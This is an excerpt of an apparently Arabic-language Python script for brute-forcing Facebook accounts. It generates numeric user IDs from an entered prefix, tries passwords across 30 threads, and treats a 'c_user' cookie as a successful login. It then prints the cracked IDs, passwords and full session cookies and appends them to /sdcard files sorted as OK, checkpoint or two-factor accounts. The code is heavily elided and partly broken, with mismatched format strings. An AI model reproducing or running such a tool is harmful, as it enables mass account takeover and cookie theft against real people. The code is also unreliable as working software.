...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL  OK : \x1b[1;97m %s  \x1b[1;97mFARES-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mFARES-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97FARES-2F.txt' %
              (H, P, str(len(twf))))
...
def xyz():
    ...
    print(f"")
    print(f"{BLUE}[01] {GREEN} ءدبلل دحاو بتكا")
...
def Tabii():
    ...
    print(f"")
    print(' 21892  21891  21894')
    print(f"")
    linex()
    code = input(' دوكال لخدا: ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  5000 راتخا   \033[0;m]")
    print(f"")
    limit = int(input(' لاثم: 1000, 2000, 5000, 10000\n\n : '))
    ...
    with ThreadPool(max_workers=30) as yaari:    
        ...
        print(f" {BLUE}your code{GREEN}"+code)
        print(f" {BLUE}program start ")
        print(f'{GREEN}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[SAR-OK]--------------------[√]\nالرقم : '+uid+'\nالايدي   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/SAR-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[SAR-CP]---------------------[×]\nالرقم : '+uid+'\nالايدي   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/SAR-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/SAR-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAR ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
